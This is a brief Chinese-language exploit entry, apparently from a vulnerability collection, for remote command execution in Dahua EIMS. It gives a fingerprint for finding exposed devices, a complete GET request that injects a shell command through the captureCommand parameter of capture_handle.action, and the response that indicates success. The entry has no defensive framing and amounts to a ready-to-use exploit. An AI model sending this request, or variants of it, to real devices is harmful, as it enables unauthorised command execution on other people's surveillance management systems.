# 大华EIMScaptureCommand远程命令执行漏洞

大华 ｜ 命令执行 ｜ —
- **指纹**：`app="dahua-EIMS"`
- **请求**：`GET /config/asst/system_setPassWordValidate.action/capture_handle.action?captureFlag=true&captureCommand=ping%20www.baidu.com%20index.pcap HTTP/1.1`
- **响应特征**：200